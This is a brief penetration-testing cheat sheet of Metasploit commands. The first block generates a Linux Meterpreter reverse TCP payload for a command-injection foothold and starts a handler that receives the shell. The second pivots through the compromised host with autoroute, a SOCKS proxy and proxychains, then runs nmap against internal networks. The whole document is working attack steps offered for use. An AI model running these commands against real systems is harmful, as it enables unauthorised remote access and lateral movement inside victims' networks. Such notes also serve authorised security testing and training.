
# Command Injection -> Metrepreter
```bash
msfconsole
use payload/cmd/linux/http/x64/metrepreter/reverse_tcp
set LHOST <local IP/interface>
generate -f raw
# Starts handler to 
to_handler
```


# nmap Scan through compromised host
```bash
# Prereq: Have metrepreter session
# Setup route through host
use post/multi/manage/autoroute
set SESSION <session id>
set NETMASK <255.0.0.0 or CIDR>
set SUBNET <ip>
run
# To see defined routes
route

# Setup SOCKS proxy
use auxiliary/server/socks_proxy
run -j
# SOCKSv5 running on 1080

# On attacker host
sudo nano /etc/proxychains.conf
# set proxies to "socks5 127.0.0.1 1080" 

# Run nmap
proxychains nmap -sT -Pn <ip/cidr>

```